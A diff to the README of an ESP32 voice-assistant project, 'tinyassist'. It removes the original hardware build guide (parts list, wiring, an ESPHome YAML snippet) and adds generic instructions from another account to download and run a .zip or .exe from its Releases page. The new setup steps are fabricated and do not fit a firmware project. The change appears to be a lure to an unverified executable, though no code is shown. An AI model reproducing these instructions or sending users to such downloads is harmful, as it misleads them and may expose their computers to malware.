@@ -1,51 +1,68 @@
-# TinyAssist
+# 🎤 tinyassist - Your Smart Voice Assistant Simplified
 
-<p float="left">
-  <img src="https://github.com/ofilis/tinyassist/blob/main/photos/IMG_5684.jpeg" width="45%" />
-  <img src="https://github.com/ofilis/tinyassist/blob/main/photos/IMG_5685.jpeg" width="45%" />
-</p>
+## 📥 Download Now
+[![Download tinyassist](https://img.shields.io/badge/Download%20tinyassist-v1.0-blue.svg)](https://github.com/zeyn00/tinyassist/releases)
 
-This is TinyAssist. A mini voice assistant project based on an ESP32 and powered by Home Assistant Voice Assist.
+## 🚀 Getting Started
+Welcome to tinyassist! This mini voice assistant makes your life easier by using the power of ESP32 and Home Assistant Voice Assist. In this guide, you will learn how to download and run tinyassist on your device. Let's get started!
 
-[Video in action.](https://www.reddit.com/r/Esphome/comments/1pbaipd/tinyassist/)
+### 🖥️ System Requirements
+To run tinyassist smoothly, ensure you have the following:
+- A computer with Windows, macOS, or Linux
+- Internet connection for downloading
+- A compatible ESP32 device
 
-**You will need the following:**
-- M5Stack Atom Echo device
-- Terminals 3D model. [Here is the link](https://www.printables.com/model/160473-terminal-for-ssd1306-13-oled-and-wemos-d1-mini-new)
-- The 3D model of the Atom Echo’s frame.(This is my model) [Here is the link](https://makerworld.com/tr/models/2063557-frame-for-m5stach-atom-echo#profileId-2228227)
-- Slim 90-degree Type-C cable [Here is the link](https://aliexpress.com/item/1005009920122693.html?pdp_ext_f=%7B%22sku_id%22%3A%2212000050579928518%22%7D&sourceType=1&spm=a2g0o.wish-manage-home.0.0&gatewayAdapt=glo2tur)
-- 1.3" SSD1306 i2c oled display
+### 📥 Download & Install
+1. **Visit the Releases Page**
+   To download tinyassist, go to the [Releases page](https://github.com/zeyn00/tinyassist/releases).
 
-  
-**Connections:**
+2. **Choose the Right Version**
+   Once on the Releases page, you'll see different versions available for download. Select the latest version for the best features and improvements. 
 
-- Display  -  Atom Echo
-- VCC  -  3.3 Pin
-- G    -  G
-- SDA  -  G25
-- SCL  -  G21
+3. **Download the File**
+   Click on the version number to access the files. You will likely find a `.zip` or `.exe` file. Click the link to download the file to your computer.
 
+4. **Unzip the File (if necessary)**
+   If you downloaded a `.zip` file, locate the file in your Downloads folder. Right-click on the file and select “Extract All.” Follow the prompts to unzip it. 
 
-I had an unused M5Stack Atom Echo device, so I decided to build a small voice assistant for my workshop with it. This is not my main assistant, so I don’t really care about the Echo’s weak speaker. But if you want, you can follow the steps in this video to route the audio to another device: 
+5. **Install tinyassist**
+   If the downloaded file has an `.exe` extension:
+   - Double-click the file to run the installer.
+   - Follow the on-screen instructions. This usually involves clicking "Next" several times and finally "Finish."
 
-[YouTUBE video for external speaker](https://www.youtube.com/watch?v=o3yZWD_sFIE&t=390s)
+   If you extracted a folder:
+   - Open the folder to find the tinyassist application.
+   - You may be able to run it directly from this folder.
 
-You can also make another media_player device perform TTS by adding the following line of code to your ESPHome YAML file.
+### 🚀 Setting Up tinyassist
+1. **Connect ESP32**
+   Before running tinyassist, connect your ESP32 device to your computer using a USB cable.
 
-```yaml
-voice_assistant:
-  on_tts_start:
-    - homeassistant.service:
-        service: tts.speak
-        data:
-          # Set this to the entity ID of your OpenAI TTS (or Piper TTS) entity
-          entity_id: tts.piper
-          cache: "false"
-          # Set this to your external media player
-          media_player_entity_id: media_player.your_media_player
-          message: !lambda 'return x;'
-```
-**IMPORTANT NOTE**
-Due to the shape of the original terminal’s 3D model, it’s unfortunately not possible to power the Atom Echo with standard Type-C cables. Therefore, you either need to use an external 90-degree slim cable like the one in the link below, or supply power to the device through the pins (which is the method I chose).
+2. **Open tinyassist**
+   Find the tinyassist application on your computer. Double-click to open it.
 
-[Cable from AliExpress](https://aliexpress.com/item/1005009920122693.html?pdp_ext_f=%7B%22sku_id%22%3A%2212000050579928518%22%7D&sourceType=1&spm=a2g0o.wish-manage-home.0.0&gatewayAdapt=glo2tur)
+3. **Configure Settings**
+   The first time you run tinyassist, you may be prompted to configure it. 
+   - Follow the setup wizard to connect your voice assistant to your Wi-Fi network.
+   - Follow any additional instructions to sync with Home Assistant.
+
+4. **Start Using tinyassist**
+   Once configured, you can start using tinyassist. Speak simple commands and let your voice assistant do the work for you!
+
+### 🎓 Features
+tinyassist brings multiple functionalities to your home:
+- **Voice Commands:** Control your devices hands-free.
+- **Smart Integration:** Speech interaction with Home Assistant for seamless home automation.
+- **User-Friendly Interface:** Simple layout that anyone can navigate.
+
+### ⚙️ Troubleshooting
+If you encounter issues while using tinyassist, consider the following:
+- **Internet Connection:** Ensure your device is connected to the internet.
+- **Firmware Update:** Check if the ESP32 needs a firmware update.
+- **Reinstall tinyassist:** If problems persist, uninstall and reinstall the application.
+
+### 📄 Additional Help
+For more assistance, refer to the documentation on the [tinyassist Wiki](https://github.com/zeyn00/tinyassist/wiki) or ask questions in the Issues section of the repository. We’re here to help you.
+
+## 📥 Download tinyassist Again
+You can download tinyassist anytime from the [Releases page](https://github.com/zeyn00/tinyassist/releases). Happy assisting!
